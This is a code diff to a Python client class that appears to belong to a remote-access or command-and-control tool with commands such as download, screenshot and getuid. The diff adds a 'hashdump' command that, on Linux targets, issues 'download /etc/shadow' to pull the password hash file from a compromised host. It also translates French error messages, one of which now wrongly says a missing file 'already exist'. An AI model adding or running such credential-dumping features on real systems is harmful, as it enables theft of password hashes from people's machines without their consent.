@@ -51,9 +51,17 @@ class Client:
             return self.dowload(command)
         elif command.lower() == "screenshot":
             return "screenshot"
+        elif command.lower() == "hashdump":
+            return self.hashdump()
         else:
             print("Unknown command. Try 'help' or '?' to display help", end="\n\n")
             return "unknown"
+
+    def hashdump(self):
+        if self.os_client == "Linux":
+            return "download /etc/shadow"
+        elif self.os_client == "Windows":
+            return "error"
 
     def getuid(self):
         if self.os_client == "Linux":
@@ -67,7 +75,7 @@ class Client:
         file_path = file_path.replace('"', '')
         print("file_path: ", file_path)
         if not os.path.isfile(file_path):
-            print(f"Le fichier {file_path} n'existe pas.")
+            print(f"The file {file_path} doesn't exist.")
             return "error"
 
         return command
@@ -78,7 +86,7 @@ class Client:
         file_path = file_path.replace('"', '')
         print("file_path: ", file_path)
         if not os.path.isfile(file_path):
-            print(f"Le fichier {file_path} n'existe pas.")
+            print(f"The file {file_path} already exist.")
             return "error"
 
         return command
